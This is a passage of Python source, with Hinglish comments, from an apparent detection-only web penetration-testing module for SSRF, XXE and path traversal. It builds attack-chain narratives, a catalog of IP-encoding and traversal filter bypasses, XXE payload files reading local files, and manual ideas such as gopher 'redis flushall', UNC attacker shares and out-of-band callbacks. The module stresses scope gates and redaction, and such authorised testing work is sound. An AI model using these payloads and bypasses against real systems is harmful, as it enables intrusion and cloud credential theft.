    xf = [r for r in xxe_recs if r.get("verdict") == "CONFIRMED"]
    xp = [r for r in xxe_post_recs if r.get("verdict") == "CONFIRMED"]
    tc = [t for t in trav_recs if t.get("verdict") == "CONFIRMED"]
    bp = [b for b in bypass_recs if b.get("winning_variant")]
    hh = [h for h in header_recs if h.get("verdict") == "SUSPECTED"]
    reach_ports = [p for s in smoke_recs if not s.get("gated")
                   for hhx in s.get("hosts", []) for p in hhx.get("ports", [])
                   if p.get("verdict") == "REACHABLE"]

    def chain(cid, name, sev, steps, impact, prereq, next_phase):
        chains.append({"id": cid, "name": name, "severity": sev, "steps": steps,
                       "impact": impact, "prereq": prereq,
                       "next_phase": next_phase,
                       "detection_only": True})

    if fr:
        chain(1, "Full-Read SSRF -> internal takeover", "critical",
              ["URL-fetcher full response return karta hai (%s)" % fr[0]["url"],
               "attacker ANY internal URL fetch karwa sakta hai (chunav apna)",
               "internal admin/debug panels + metadata + file:// sab reachable"],
              "internal network ki server-side proxy ban jaata hai",
              "koi auth nahi chahiye (pre-auth fetcher ho to critical)",
              "P20 logic / P24 cloud")
    if md:
        chain(2, "SSRF -> Cloud IMDS -> cloud admin (MANUAL creds wave)", "critical",
              ["fetcher se metadata reachable (%s)" % md[0]["url"],
               "providers: %s" % ",".join(p["provider"] for p in md[0]["providers"]),
               "MANUAL (RoE): security-credentials path se IAM role creds",
               "creds -> S3/EC2/STS assume -> cloud takeover (P24)"],
              "cloud account-level compromise",
              "IMDSv1 ya header-injection-capable SSRF",
              "P24 cloud")
    if fr and md:
        chain(3, "Full-Read + IMDS = exfil-ready chain", "critical",
              ["full-read fetcher + metadata reachability dono CONFIRMED",
               "response body me credentials dikh sakte hain (MANUAL verify)",
               "hamne sirf non-secret markers check kiye (content redacted)"],
              "one-request credential exfil (manual wave me hi)",
              "dono primitives same target par",
              "P24 cloud")
    if xf or xp:
        chain(4, "XXE -> file read -> config secrets -> app takeover", "critical",
              ["XML parser external entity resolve karta hai",
               "app config (/etc/hostname proved read; config paths MANUAL)",
               "config se DB creds / secret keys -> P9 login ya session forgery"],
              "local file read se credential-led takeover",
              "parser DTD block nahi karta",
              "P9 auth / P23 misconfig")
    if any(r.get("saml") or "saml" in r["url"].lower() for r in xf + xp):
        chain(5, "SAML XXE -> assertion tampering", "critical",
              ["SAML assertion parser entities resolve karta hai",
               "response me file content inject/manual assert tamper",
               "unsigned assertion accept -> auth bypass (P9 chain)"],
              "SSO-level auth bypass",
              "SAML endpoint + weak parser",
              "P9 auth")
    if tc:
        chain(6, "Traversal -> secrets read -> session forgery", "critical",
              ["path normalization missing (%s)" % tc[0]["url"],
               "winning variant: %s" % tc[0].get("winning_variant", ""),
               "app-internal config/key files read -> HMAC/JWT secret -> "
               "arbitrary session sign (P10 chain)"],
              "credential-free session forgery potential",
              "relative-path endpoint",
              "P10 sessions")
    if bp:
        chain(7, "Filter-bypass -> SSRF re-opens", "high",
              ["anti-SSRF filter string/blocklist-based hai",
               "winning variant: %s (parses differently)" % bp[0]["winning_variant"],
               "filter bypass hote hi full SSRF family wapas open"],
              "defense-in-depth gap ko one-variant se degrade",
              "allow-list/deny-list parser mismatch",
              "P23 misconfig")
    if hh:
        chain(8, "Host-header SSRF -> cache poison -> persistent XSS/pre-auth",
              "high",
              ["X-Forwarded-Host reflect hota hai (links/canonical/redirects)",
               "cache me poisoned URL store (P26 chain)",
               "poisoned response har visitor ko jaata hai"],
              "site-wide client-side impact ek request se",
              "cacheable route + host reflect",
              "P26 cache")
    if reach_ports:
        chain(9, "Internal service exposure via SSRF", "medium",
              ["fetcher se loopback/own-IP services reachable: %s" %
               ",".join("%s:%s" % (p["host"], p["port"]) for p in reach_ports[:4]),
               "banners: %s" % ",".join((p.get("server") or "?") for
                                        p in reach_ports[:3]) or "n/a",
               "internal panels/debug endpoints MANUAL enumerate karo (sirf "
               "reachability auto-proved hai)"],
              "internal attack-surface ka server-side view",
              "ssrf_internal_smoke RoE gate ON tha",
              "P23 misconfig")
    if not chains:
        chain(1, "SSRF surface mapped - no confirmed chain", "info",
              ["seed targets par fetch/xxe/traversal probes safe nikle"],
              "recon-grade evidence", "-", "P16/P17")
    chains.sort(key=lambda c: SEV_ORDER.get(c["severity"], 4))
    return chains


def build_ssrf_hypotheses(fetch_recs, metadata_recs, xxe_recs, xxe_post_recs,
                          trav_recs, bypass_recs):
    """9 manual-wave hypotheses (RoE notes ke saath)."""
    hyps = []
    gated_post = any(r.get("verdict") == "SKIPPED" for r in xxe_post_recs)
    if gated_post:
        hyps.append("POST-based XXE (docx/svg/saml import) RoE gate OFF the - "
                    "ssrf_allow_post=true + RoE confirm karke re-run karo "
                    "(payloads xxe_payloads/ me INERT ready hain)")
    if any(m.get("verdict") == "CONFIRMED" for m in metadata_recs):
        hyps.append("IMDS MANUAL wave: token/credential paths sirf cloud team "
                    "ke saath (hamne kabhi fetch nahi kiya) - P24 me use hoga")
    hyps.append("Gopher/dict scheme abuse (redis flushall / smtp) MANUAL-ONLY - "
                "destructive potential ke wajah se kabhi auto nahi")
    hyps.append("DNS rebinding (TOCTOU): attacker-DNS + retry-window - manual "
                "setup chahiye (rebind.network jaisa service)")
    hyps.append("PDF-generator SSRF: <img src=http://169.254.169.254/> manual "
                "test (render output me metadata text dikh sakta hai)")
    hyps.append("IPv6/zone-id metadata (fd00:ec2::254%eth0) - parser-specific, "
                "manual curl se verify karo")
    hyps.append("SAML XXE full chain: signed assertion replace + entity-based "
                "comment injection - Burp se manual")
    hyps.append("Windows UNC traversal (\\\\attacker\\share) - external egress "
                "hota hai isliye AUTO FORBIDDEN, RoE me allow ho to manual")
    hyps.append("XXE->SSRF via OOB (interact.sh/collab) - engagement policy "
                "external callback allow kare to hi (default zero-egress)")
    return hyps


# ===========================================================================
# STAGE K - REPORT BUILDERS (MD / test-plan / chains / catalog / CWE map)
# ===========================================================================
def build_cwe_map():
    return [
        {"cwe": "CWE-918", "name": "Server-Side Request Forgery (SSRF)",
         "owasp": "A10:2021 SSRF", "phases": ["P15"], "keys":
         ["ssrf_full_read", "ssrf_self_fetch", "ssrf_blind_differential",
          "ssrf_internal_reachable", "ssrf_redirect_internal",
          "ssrf_webhook_novalidate"]},
        {"cwe": "CWE-918/CWE-441", "name": "SSRF via URL-parser confusion",
         "owasp": "A10:2021", "phases": ["P15"], "keys":
         ["ssrf_ip_bypass", "ssrf_parse_confusion"]},
        {"cwe": "CWE-807/CWE-918", "name": "Cloud metadata (IMDS) exposure",
         "owasp": "A10:2021", "phases": ["P15", "P24"], "keys":
         ["ssrf_metadata_reachable", "ssrf_metadata_imdsv2"]},
        {"cwe": "CWE-611", "name": "XXE (improper restriction of XML external "
         "entity reference)", "owasp": "A05:2021 Security Misconfiguration",
         "phases": ["P15"], "keys":
         ["xxe_file_read", "xxe_error_based", "xxe_param_entity_blind",
          "xxe_xinclude", "xxe_php_filter", "xxe_svg_doc", "xxe_office_import",
          "xxe_saml", "xxe_dtd_internal_fetch"]},
        {"cwe": "CWE-776", "name": "Improper restriction of recursive entity "
         "references (billion laughs - FORBIDDEN class)", "owasp": "A05:2021",
         "phases": ["P15"], "keys": [], "note": "detection-only me kabhi probe nahi"},
        {"cwe": "CWE-22", "name": "Path Traversal", "owasp": "A01:2021 Broken "
         "Access Control", "phases": ["P12", "P15"], "keys":
         ["traversal_file_read", "traversal_encoding_bypass",
          "traversal_absolute_path", "traversal_null_byte_legacy"]},
        {"cwe": "CWE-23", "name": "Relative path traversal", "owasp": "A01",
         "phases": ["P15"], "keys": ["traversal_encoding_bypass"]},
        {"cwe": "CWE-36", "name": "Absolute path traversal", "owasp": "A01",
         "phases": ["P15"], "keys": ["traversal_absolute_path"]},
        {"cwe": "CWE-639/CWE-284", "name": "Internal service exposure via SSRF",
         "owasp": "A01", "phases": ["P15", "P23"], "keys":
         ["ssrf_internal_reachable"]},
        {"cwe": "CWE-444", "name": "HTTP request smuggling surface (header "
         "host confusion)", "owasp": "A05", "phases": ["P15", "P26"], "keys":
         ["ssrf_header_host_inject"]},
        {"cwe": "CWE-350", "name": "Reliance on reverse DNS resolution "
         "(SSRF allow-list bypass)", "owasp": "A10", "phases": ["P15"],
         "keys": ["ssrf_dns_rebinding_manual"]},
        {"cwe": "CWE-200", "name": "Exposure of sensitive information (file "
         "read)", "owasp": "A01", "phases": ["P15"], "keys":
         ["ssrf_scheme_file", "xxe_file_read", "traversal_file_read"]},
        {"cwe": "CWE-552", "name": "Files/paths accessible via external URL "
         "(file:// scheme)", "owasp": "A10", "phases": ["P15"], "keys":
         ["ssrf_scheme_file"]},
    ]


def build_catalog_md():
    """TECHNIQUES_CATALOG_SSRF.md - 40+ technique reference (manual wave notes)."""
    return """# TECHNIQUES CATALOG - SSRF / XXE / Traversal (P15 detection-only)

## SSRF families
| # | Technique | Signal used (no-exploit) | Notes |
|---|-----------|--------------------------|-------|
| 1 | Full-response SSRF | homepage sha1 via fetcher | strongest primitive |
| 2 | Canary-path differential | canary sha1 via fetcher | soft-404 aware |
| 3 | Blind status differential | self vs NXDOMAIN status | no echo needed |
| 4 | Blind timing differential | robust-z > 3.5 | 3-sample bounded |
| 5 | file:// scheme read | /etc/hostname shape | content REDACTED |
| 6 | IP decimal encoding | 2130706433 | string allow-list bypass |
| 7 | IP hex (0x7f000001 / nibbles) | 0x7f.0x0.0x0.0x1 | parser-specific |
| 8 | IP octal | 0177.0.0.1 | legacy parsers |
| 9 | Zero-padded octets | 127.000.000.001 | regex filters |
| 10 | IPv6 mapped | [::ffff:127.0.0.1] | v6-capable fetchers |
| 11 | Enclosed alphanumerics | \\u2460\\u2461\\u2467 | IDN parsers |
| 12 | Fullwidth dots | \\uff0e | CJK parser confusion |
| 13 | Trailing dot | 127.0.0.1. | FQDN canonicalizers |
| 14 | fewer-octets | 127.1 | inet_aton family |
| 15 | userinfo confusion | http://trusted@loopback | authority parsing |
| 16 | fragment confusion | http://loopback#@trusted | pre-2020 parsers |
| 17 | triple-slash | http:///loopback | WHATWG vs RFC3986 |
| 18 | backslash scheme | http:\\\\/\\\\loopback | WHATWG parsers |
| 19 | redirect bounce | target 302 -> internal | first-URL-only filters |
| 20 | X-Forwarded-Host inject | fake host reflect | cache/reset poison |
| 21 | X-Original-URL routing | /canary differential | proxy-aware apps |
| 22 | Cloud IMDS (7 providers) | marker-boolean only | creds MANUAL-ONLY |
| 23 | IMDSv2 detection | 401 token-required | hardening signal |
| 24 | Internal port smoke | 1 GET/port banner-only | RoE-gated |
| 25 | PDF-generator fetch | img/link render hypothesis | manual verify |
| 26 | Webhook/pingback SSRF | status differential | blind family |
| 27 | DNS rebinding | MANUAL (attacker DNS) | TOCTOU |
| 28 | Gopher/dict | MANUAL-ONLY (destructive misuse) | kabhi auto nahi |
| 29 | UNC paths (\\\\host\\share) | MANUAL-ONLY (external egress) | RoE |
| 30 | Protocol smuggling (TLS-start) | MANUAL note | advanced labs |

## XXE families
| # | Technique | Signal | Notes |
|---|-----------|--------|-------|
| 31 | Classic external entity | in-band marker / error | file:// only |
| 32 | Error-based XXE | parser error fingerprints | 6 engine families |
| 33 | Param-entity blind | DTD fetch error differential | OOB-less |
| 34 | Internal DTD fetch | loopback DTD differential | XXE->SSRF chain |
| 35 | XInclude parse=text | hostname shape | fragment endpoints |
| 36 | php://filter roundtrip | double-decode plaintext | encoded content kabhi store nahi |
| 37 | SVG entity | image/svg+xml parser | P16 upload chain |
| 38 | docx import entity | [Content_Types].xml entity | INERT zip payload |
| 39 | SAML assertion XXE | auth parser | P9 chain, critical |
| 40 | XML-RPC listMethods | read-only enumeration | write methods MANUAL |
| 41 | Parser differential (hardened) | DOCTYPE-reject prints | positive signal |
| 42 | Billion laughs | FORBIDDEN | DoS-class, kabhi nahi |

## Traversal families
| # | Technique | Signal | Notes |
|---|-----------|--------|-------|
| 43 | Raw ../ | marker boolean | baseline |
| 44 | URL encoding %2e%2e%2f | marker | filter bypass |
| 45 | Double encoding %252e | marker | WAF bypass |
| 46 | Overlong UTF-8 %c0%ae | marker | legacy decoders |
| 47 | Fullwidth %uff0e | marker | unicode normalize |
| 48 | Tomcat ;/ | marker | java routing |
| 49 | Spring ..%2f | marker | framework routing |
| 50 | Null-byte %00 | marker | legacy runtimes (bounded 2 tries) |
| 51 | Absolute path injection | marker | path-join bug |
| 52 | file:// scheme injection | marker | file-param endpoints |
| 53 | Windows backslash/enc | marker | IIS/windows stacks |
| 54 | UNC | MANUAL-ONLY | external egress risk |

**Safety invariants (is catalog ka har auto-probe inhi ke andar hai):**
zero external egress, FORBIDDEN metadata paths hard-filtered, file content
sirf len/sha1/marker, entity expansion 2-level max, POST RoE-gated, smoke
loopback+own-IP only, billion-laughs/UNC/gopher kabhi auto nahi.
"""


def _ssrf_findings_md(F, meta, fetch_recs, bypass_recs, metadata_recs,
                      xxe_recs, trav_recs, chains, conf):
    lines = ["# SSRF FINDINGS (Phase 15 - detection-only)", "",
             "**Target**: %s  |  **Engine**: v%s  |  **Generated**: %s" % (
                 meta.get("base_url", "-"), PLAN_VERSION, now_human()), "",
             "## Verdict summary", ""]
    from collections import Counter
    for grp, recs in (("fetch/SSRF", fetch_recs), ("bypass", bypass_recs),
                      ("metadata", metadata_recs), ("xxe", xxe_recs),
                      ("traversal", trav_recs)):
        c = Counter(r.get("verdict") for r in recs)
        lines.append("- **%s**: %s" % (grp, ", ".join(
            "%s=%d" % (k, v) for k, v in sorted(c.items())) or "empty"))
    lines += ["", "## Findings (%d)" % len(F.items), ""]
    for f in F.items:
        lines.append("### [%s] %s" % (f["severity"].upper(), f["title"]))
        lines.append("- **Endpoint**: `%s`" % f["endpoint"])
        lines.append("- **Detail**: %s" % f["detail"])
        lines.append("- **Why it matters**: %s" % f["why_it_matters"])
        lines.append("- **Evidence**: %s  |  **CVSS hint**: %s" % (
            f["evidence"] or "-", f["cvss_hint"]))
        lines.append("")
    if chains:
        lines += ["## Kill-chains (detection-only narratives)", ""]
        for c in chains:
            lines.append("**CHAIN %d [%s] %s**" % (c["id"], c["severity"],
                                                   c["name"]))
            for i, s in enumerate(c["steps"], 1):
                lines.append("  %d. %s" % (i, s))
            lines.append("- Impact: %s" % c["impact"])
            lines.append("- Next: %s" % c["next_phase"])
            lines.append("")
    lines += ["## Safety discipline (is run me enforce)", "",
              "- Zero external egress (sirf target/loopback/.invalid probes)",
              "- Cloud metadata: SAFE paths only; credentials kabhi fetch/store "
              "nahi (manual wave documented)",
              "- File/traversal/XXE content REDACTED (len/sha1/marker-boolean)",
              "- POST-based XXE RoE-gated: ssrf_allow_post=%s" %
              bool(conf.get("ssrf_allow_post")),
              "- Internal smoke: ssrf_internal_smoke=%s (default OFF)" %
              bool(conf.get("ssrf_internal_smoke"))]
    return "\n".join(lines) + "\n"


def _xxe_findings_md(xxe_recs, xxe_post_recs, payload_files):
    lines = ["# XXE FINDINGS (Phase 15 - detection-only)", "",
             "Parser-trust audit ka dedicated report (SSRF se separate).", ""]
    lines.append("## GET/param-parser endpoints (%d)" % len(xxe_recs))
    for r in xxe_recs:
        lines.append("- `%s` -> **%s** %s" % (r["url"], r["verdict"],
                     ("technique=%s" % r["technique"]) if r.get("technique") else ""))
        for s in r.get("signals", [])[:6]:
            lines.append("  - signal: %s" % s)
    lines.append("")
    lines.append("## POST/import families (%d)" % len(xxe_post_recs))
    for r in xxe_post_recs:
        lines.append("- `%s` -> **%s** (%s)" % (r["url"], r.get("verdict"),
                                                r.get("post_gate", "")))
        for f in r.get("families", [])[:8]:
            lines.append("  - %s: status=%s marker=%s errfam=%s" % (
                f.get("family"), f.get("status"), f.get("marker"),
                f.get("errfam")))
    lines += ["", "## INERT payloads (xxe_payloads/)", ""]
    for p in payload_files:
        lines.append("- `%s`" % p)
    lines += ["", "## Error fingerprint DB",
              "libxml2 / PHP / Java-SAX / .NET / Go / Generic - 6 families "
              "ka regex DB xxe engine me built-in hai (error-based verdicts "
              "isi se hote hain).", ""]
    return "\n".join(lines) + "\n"


def _ssrf_test_plan_md(hyps, chains, fetch_recs, metadata_recs, conf):
    L = ["# SSRF/XXE/Traversal TEST PLAN (Phase 15 manual wave)", "",
         "Auto-run sirf detection-layer cover karta hai. Ye manual items "
         "RoE ke under in-service verify karo.", "",
         "## Manual wave (9 hypotheses)", ""]
    for i, h in enumerate(hyps, 1):
        L.append("%d. %s" % (i, h))
    L += ["", "## Kill-chain validation order", ""]
    for c in chains:
        L.append("- **%s** [%s] -> %s" % (c["name"], c["severity"],
                                          c["next_phase"]))
    L += ["", "## Re-run knobs (RoE gates)", "",
          "- `ssrf_allow_post=true` -> POST XXE families (svg/docx/saml/xmlrpc)",
          "- `ssrf_internal_smoke=true` -> loopback/own-IP port smoke "
          "(5 benign ports)",
          "- `metadata_base` -> air-gapped/mock IMDS override",
          "- passive mode (`allow_active=false`) -> 0 probes, census only", "",
          "## RoE reminders", "",
          "- IMDS credential paths: kabhi auto; manual me bhi redact + "
          "engagement policy check",
          "- External OOB (interact.sh) sirf policy allow kare",
          "- Timing probes bounded (3-sample), DoS-class payloads forbidden"]
    return "\n".join(L) + "\n"


def _ssrf_chains_text(chains, fetch_recs, xxe_recs, trav_recs):
    L = ["WASP P15 SSRF/XXE/TRAVERSAL CHAINS (detection-only narratives)",
         "=" * 64, ""]
    for c in chains:
        L.append("CHAIN %d [%s] %s" % (c["id"], c["severity"].upper(),
                                       c["name"]))
        for i, s in enumerate(c["steps"], 1):
            L.append("  %d. %s" % (i, s))
        L.append("  IMPACT : %s" % c["impact"])
        L.append("  PREREQ : %s" % c["prereq"])
        L.append("  NEXT   : %s" % c["next_phase"])
        L.append("")
    L.append("CONFIRMED ENDPOINTS SUMMARY")
    for r in fetch_recs:
        if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            L.append("  SSRF  %-5s %s (%s)" % (r["verdict"][:4], r["url"],
                                               r.get("technique", "")))
    for r in xxe_recs:
        if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
            L.append("  XXE   %-5s %s (%s)" % (r["verdict"][:4], r["url"],
                                               r.get("technique", "")))
    for r in trav_recs:
        if r.get("verdict") == "CONFIRMED":
            L.append("  TRAV  %-5s %s (%s)" % (r["verdict"][:4], r["url"],
                                               r.get("technique", "")))
    return "\n".join(L) + "\n"


# ===========================================================================
# STAGE K - REPORTS WRITER (26+ output files)
# ===========================================================================
def write_inert_payloads(out, xxe_payloads_cap=8):
    """xxe_payloads/ - INERT reference payloads (manual wave ke liye ready,
    koi auto-send nahi). Files list return karta hai."""
    d = _rwx_dir(os.path.join(out, "xxe_payloads"))
    items = [
        ("classic_file_hostname.xml", xxe_classic("file://" + XXE_CANARY_FILE)),
        ("classic_file_passwd_marker.xml", xxe_classic("file://" + XXE_MARKER_FILE)),
        ("param_entity_blind.xml",
         xxe_param_entity("http://wasp-p15-manual.invalid/manual.dtd")),
        ("dtd_internal_fetch.xml", xxe_dtd_internal(
            "http://127.0.0.1/MANUAL_PORT/waspP15.dtd")),
        ("xinclude_hostname.xml", xxe_xinclude("file://" + XXE_CANARY_FILE)),
        ("php_filter_hostname.xml", xxe_php_filter(XXE_CANARY_FILE)),
        ("svg_entity.svg", xxe_svg("file://" + XXE_CANARY_FILE)),
        ("saml_assertion_entity.xml", xxe_saml("file://" + XXE_CANARY_FILE)),
    ]
    written = []
    for name, body in items[:max(1, xxe_payloads_cap)]:
        _rwx_save_text(os.path.join(d, name),
                       body + "\n\n<!-- INERT reference payload - WASP P15 "
                              "detection-only. Manual RoE ke under hi use "
                              "karo. File content kabhi store nahi hota -->\n")
        written.append(name)
    docx = os.path.join(d, "docx_entity_import.docx")
    try:
        with open(docx, "wb") as f:
            f.write(xxe_docx_bytes("file://" + XXE_CANARY_FILE))
        _rwx_result(docx)
        written.append("docx_entity_import.docx")
    except Exception:
        pass
    readme = os.path.join(d, "README.txt")
    _rwx_save_text(readme,
                   "WASP P15 INERT XXE payloads - reference only.\n"
                   "Detection-only: ye payloads kisi endpoint par AUTO-SEND "
                   "nahi hote (sirf ssrf_allow_post=true RoE gate par bheje "
                   "jaate hain). Manual wave ke liye Burp/curl me copy karo.\n"
                   "Safety: file content responses REDACTED store hote hain.\n")
    written.append("README.txt")
    return written


def write_reports(out, scope, F, ctx, meta, results_by_stage, hypotheses,
                  ranked, chains, conf):
    """Sab artifacts save + feedforward + manifest. Returns file list."""
    fetch_recs = results_by_stage.get("fetch", {}).get("data", [])
    bypass_recs = results_by_stage.get("bypass", {}).get("data", [])
    metadata_recs = results_by_stage.get("metadata", {}).get("data", [])
    smoke_recs = results_by_stage.get("smoke", {}).get("data", [])
    xxe_recs = results_by_stage.get("xxe", {}).get("data", [])
    xxe_post_recs = results_by_stage.get("xxe_post", {}).get("data", [])
    trav_recs = results_by_stage.get("traversal", {}).get("data", [])
    header_recs = results_by_stage.get("header", {}).get("data", [])
    tm = results_by_stage.get("techniques", {}).get("data", [])

    # ---- surface + targets ----
    _rwx_save_json(os.path.join(out, "ssrf_surface.json"), {
        "phase": PHASE, "version": PLAN_VERSION, "generated": now_iso(),
        "engagement": scope.engagement, "base_url": meta.get("base_url"),
        "sources_mined": meta.get("sources", []),
        "os_hints": meta.get("os_hints", []),
        "import_paths": meta.get("import_paths", [])[:40],
        "saml_endpoints": meta.get("saml_endpoints", []),
        "webhook_paths": meta.get("webhook_paths", []),
        "ranked": ranked, "coverage": ctx.get("coverage", {})})
    _rwx_save_text(os.path.join(out, "ssrf_targets.txt"), "\n".join(
        "%s %s %s %s" % (t["kind"], t["score"], t["param"], t["url"])
        for t in ranked) + "\n")

    # ---- matrices + logs ----
    _rwx_save_json(os.path.join(out, "ssrf_matrix.json"), fetch_recs)
    _rwx_save_json(os.path.join(out, "bypass_matrix.json"), bypass_recs)
    _rwx_save_json(os.path.join(out, "metadata_cloud.json"), {
        "policy": "SAFE-paths-only; FORBIDDEN_PATH_PATTERNS=%s; "
                  "content markers-only redacted" % ",".join(
                      FORBIDDEN_PATH_PATTERNS[:5]) + "...",
        "providers_probed": len(_metadata_probes(conf)),
        "records": metadata_recs,
        "manual_wave": METADATA_MANUAL_WAVE})
    _rwx_save_json(os.path.join(out, "internal_smoke.json"), smoke_recs)
    _rwx_save_json(os.path.join(out, "scheme_matrix.json"), {
        "probed": ["http", "https", "file"],
        "manual_only": ["gopher", "dict", "ftp", "netdoc", "jar", "phar",
                        "expect", "ldap", "UNC (\\\\)"],
        "forbidden_auto": ["gopher", "dict", "expect", "UNC"],
        "records": [{"url": r["url"], "scheme_file_signal":
                     [s for s in r.get("signals", []) if s.startswith(
                         "scheme-file")]} for r in fetch_recs]})
    _rwx_save_json(os.path.join(out, "differential_engine.json"),
                   differential_summary(fetch_recs, conf))
    _rwx_save_json(os.path.join(out, "header_host_probe.json"), header_recs)
    _rwx_save_json(os.path.join(out, "xxe_surface.json"), {
        "targets": [r["url"] for r in xxe_recs],
        "post_targets": [r["url"] for r in xxe_post_recs],
        "post_gate": bool(conf.get("ssrf_allow_post")),
        "saml_endpoints": meta.get("saml_endpoints", []),
        "payload_dir": "xxe_payloads/"})
    _rwx_save_json(os.path.join(out, "xxe_matrix.json"), xxe_recs)
    _rwx_save_json(os.path.join(out, "xxe_post_matrix.json"), xxe_post_recs)
    _rwx_save_json(os.path.join(out, "traversal_matrix.json"), trav_recs)
    _rwx_save_json(os.path.join(out, "waf_map_ssrf.json"), {
        "endpoints": [{"url": r["url"], "waf": (r.get("baseline") or {}).get("waf"),
                       "blocked": r.get("verdict") == "BLOCKED"}
                      for r in fetch_recs]})
    _rwx_save_json(os.path.join(out, "technique_matrix_ssrf.json"), tm)
    _rwx_save_json(os.path.join(out, "cwe_owasp_map_ssrf.json"), build_cwe_map())

    # ---- probe log (urls only, no bodies) ----
    probe_log = []
    for r in fetch_recs:
        for k, v in (r.get("probes") or {}).items():
            if isinstance(v, dict):
                probe_log.append({"endpoint": r["url"], "probe": k,
                                  "status": v.get("status"),
                                  "len": v.get("len"), "error": v.get("error")})
    _rwx_save_json(os.path.join(out, "ssrf_probe_log.json"),
                   probe_log[:400])

    # ---- payload dir (INERT) ----
    payload_files = write_inert_payloads(out)
    ctx["pocs"] = ctx.get("pocs", []) + ["xxe_payloads/" + p
                                         for p in payload_files]

    # ---- MD reports ----
    _rwx_save_text(os.path.join(out, "SSRF_FINDINGS.md"), _ssrf_findings_md(
        F, meta, fetch_recs, bypass_recs, metadata_recs, xxe_recs, trav_recs,
        chains, conf))
    _rwx_save_text(os.path.join(out, "XXE_FINDINGS.md"), _xxe_findings_md(
        xxe_recs, xxe_post_recs, payload_files))
    _rwx_save_text(os.path.join(out, "ssrf_test_plan.md"), _ssrf_test_plan_md(
        hypotheses, chains, fetch_recs, metadata_recs, conf))
    _rwx_save_text(os.path.join(out, "ssrf_chains.txt"), _ssrf_chains_text(
        chains, fetch_recs, xxe_recs, trav_recs))
    _rwx_save_text(os.path.join(out, "TECHNIQUES_CATALOG_SSRF.md"),
                   build_catalog_md())

    # ---- findings.json ----
    _rwx_save_json(os.path.join(out, "findings.json"),
                   {"module": NAME, "phase": PHASE, "version": PLAN_VERSION,
                    "count": len(F.items), "findings": F.items,
                    "generated": now_iso()})

    # ---- feedforward ----
    ssrf_conf = [r["url"] for r in fetch_recs if r.get("verdict") == "CONFIRMED"]
    ssrf_susp = [r["url"] for r in fetch_recs if r.get("verdict") == "SUSPECTED"]
    xxe_conf = [r["url"] for r in xxe_recs + xxe_post_recs
                if r.get("verdict") == "CONFIRMED"]
    trav_conf = [r["url"] for r in trav_recs if r.get("verdict") == "CONFIRMED"]
    hh_susp = [h["url"] for h in header_recs if h.get("verdict") == "SUSPECTED"]
    md_conf = [m["url"] for m in metadata_recs if m.get("verdict") == "CONFIRMED"]
    write_feedforward(out, PHASE, {
        "to_phase16_files": {"svg_doc_endpoints": [r["url"] for r in
                                                   xxe_post_recs],
                             "traversal_confirmed": trav_conf,
                             "note": "upload/import par SVG/docx XXE P16 me"},
        "to_phase17_api": {"xml_api_endpoints": [r["url"] for r in xxe_recs],
                           "fetch_params": [r["param"] for r in fetch_recs
                                            if r.get("param")]},
        "to_phase20_logic": {"ssrf_confirmed": ssrf_conf,
                             "ssrf_suspected": ssrf_susp,
                             "webhook_endpoints": [r["url"] for r in fetch_recs
                                                   if "webhook" in
                                                   r["url"].lower()]},
        "to_phase23_misconfig": {"internal_services": [
            "%s:%s" % (p.get("host"), p.get("port"))
            for s in smoke_recs for hh2 in s.get("hosts", [])
            for p in hh2.get("ports", []) if p.get("verdict") == "REACHABLE"],
            "imdsv2_hints": [m["url"] for m in metadata_recs
                             if m.get("imds2_hint")]},
        "to_phase24_cloud": {"metadata_confirmed": md_conf,
                             "note": "IAM creds MANUAL wave - kabhi auto nahi"},
        "to_phase26_cache": {"header_host_injectable": hh_susp,
                             "note": "cache-poisoning chain entries"},
        "to_phase28_chains": {"chains": [c["name"] for c in chains]},
        "to_phase32_report": {"findings": len(F.items),
                              "by_severity": _sev_counts(F),
                              "chains": len(chains)},
    }, notes=["detection-only run; zero external egress; file content "
              "redacted"])

    # ---- manifest ----
    files = ["ssrf_surface.json", "ssrf_targets.txt", "ssrf_matrix.json",
             "bypass_matrix.json", "metadata_cloud.json", "internal_smoke.json",
             "scheme_matrix.json", "differential_engine.json",
             "header_host_probe.json", "xxe_surface.json", "xxe_matrix.json",
             "xxe_post_matrix.json", "traversal_matrix.json", "waf_map_ssrf.json",
             "technique_matrix_ssrf.json", "cwe_owasp_map_ssrf.json",
             "ssrf_probe_log.json", "SSRF_FINDINGS.md", "XXE_FINDINGS.md",
             "ssrf_test_plan.md", "ssrf_chains.txt",
             "TECHNIQUES_CATALOG_SSRF.md", "findings.json", "feedforward.json"]
    files += ["xxe_payloads/" + p for p in payload_files]
    write_manifest(out, PHASE, files, stats={
        "targets": len(ranked), "fetch_endpoints": len(fetch_recs),
        "xxe_endpoints": len(xxe_recs), "traversal_endpoints": len(trav_recs),
        "metadata_providers": len(metadata_recs),
        "probes_total": meta.get("probes_total", 0),
        "findings": len(F.items), "chains": len(chains),
        "mode": ctx.get("mode", "active")})
    return files


def _rwx_tree(root):
    """Output folder ka compact tree + RWX enforce sab files par."""
    try:
        os.chmod(root, 0o777)
    except OSError:
        pass
    lines = []
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames.sort()
        for d in dirnames:
            _rwx_dir(os.path.join(dirpath, d))
        rel = os.path.relpath(dirpath, root)
        indent = "" if rel == "." else "  " * (rel.count(os.sep) + 1)
        if rel != ".":
            lines.append("%s%s/" % ("  " * rel.count(os.sep),
                                    os.path.basename(dirpath)))
        for fn in sorted(filenames):
            fp = os.path.join(dirpath, fn)
            _rwx_result(fp)
            lines.append("%s%s (%s)" % (indent, fn, human_size(os.path.getsize(fp))))
    return lines


# ===========================================================================
# MAIN RUN (stages A->K wiring, passive mode, resume-safe)
# ===========================================================================
def run(cfg, scope, base_out):
    t_start = time.time()
    out, ev, http, cp = module_ctx(cfg, scope, base_out, NAME)
    conf = dict(DEFAULTS)
    for k in list(conf.keys()):
        if hasattr(cfg, k):
            conf[k] = getattr(cfg, k)

    head("Phase 15 - SSRF/XXE/Traversal (detection-only, redacted) (v%s) | %s"
         % (PLAN_VERSION, scope.describe()))
    if conf.get("ssrf_allow_post"):
        warn("POST-based XXE probes ON (ssrf_allow_post=true) - sirf "
             "discovered import/parse endpoints par, INERT canary payloads.")
    if conf.get("ssrf_internal_smoke"):
        warn("Internal smoke ON (ssrf_internal_smoke=true) - SIRF target-host "
             "+ loopback, max 5 benign ports, 1 GET/port (koi RFC1918 sweep "
             "nahi).")
    if conf.get("ssrf_metadata_probe"):
        info("Cloud metadata probe ON - SAFE paths only (credentials/tokens "
             "kabhi fetch nahi hote; manual wave documented).")
